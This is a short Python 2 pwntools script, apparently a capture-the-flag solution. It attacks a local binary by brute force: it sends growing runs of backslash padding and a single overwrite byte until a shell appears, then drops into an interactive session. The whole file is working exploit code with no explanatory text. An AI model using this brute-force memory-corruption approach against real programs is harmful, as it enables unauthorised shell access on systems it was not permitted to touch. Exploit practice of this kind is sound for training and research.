#!/usr/bin/env python

from pwn import *
from time import sleep
from sys import argv

def bf():
  while True:
    with context.local(log_level='info'):
      with pwnlib.tubes.process.process(argv[1]) as p:
        p.send('x\n')
        data = p.clean_and_log()
        if '$' in data:
          print 'woot: %r' % data
          p.interactive()
          break

def dec():
  with context.local(log_level='info'):
    count = 0
    while True:
      with pwnlib.tubes.process.process(argv[1]) as p:
        print 'Testing 0x%x' % count
        p.send('\\' * count)
        p.send('x\n')
        data = p.clean_and_log()

        if '$' in data:
          p.interactive()
          break
        else:
          print ':('
          count += 0x01000000

def wow():
  with context.local(log_level='info'):
    offset = int(argv[2]) #256 + 4
    while True:
      
      with pwnlib.tubes.process.process(argv[1]) as p:
        print 'Testing %d' % offset
        p.send('\\' * offset)
        p.send('\xca')
        p.send('1234567890\n')
        data = p.clean_and_log(2)
        p.send('id\n')
        data = p.clean_and_log(2)
        if 'uid' in data:
          p.interactive()
          break
        else:
          offset += 1

        break

if __name__ == '__main__':
  wow()
